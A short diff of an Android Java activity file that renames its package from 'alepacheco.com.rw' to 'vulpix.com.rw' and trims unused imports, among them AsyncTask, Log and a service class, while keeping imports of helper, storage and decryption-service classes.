@@ -1,22 +1,18 @@
-package alepacheco.com.rw.activityes;
+package vulpix.com.rw.activityes;
 
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
-import android.os.AsyncTask;
 import android.os.Bundle;
-import android.os.SystemClock;
-import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 
-import alepacheco.com.rw.R;
-import alepacheco.com.rw.apl.Helper;
-import alepacheco.com.rw.persistence.LocalStorage;
-import alepacheco.com.rw.services.DecryptService;
-import alepacheco.com.rw.services.MyService;
+import vulpix.com.rw.R;
+import vulpix.com.rw.apl.Helper;
+import vulpix.com.rw.persistence.LocalStorage;
+import vulpix.com.rw.services.DecryptService;
 
 /**
  * Created by joao on 05/07/2017.
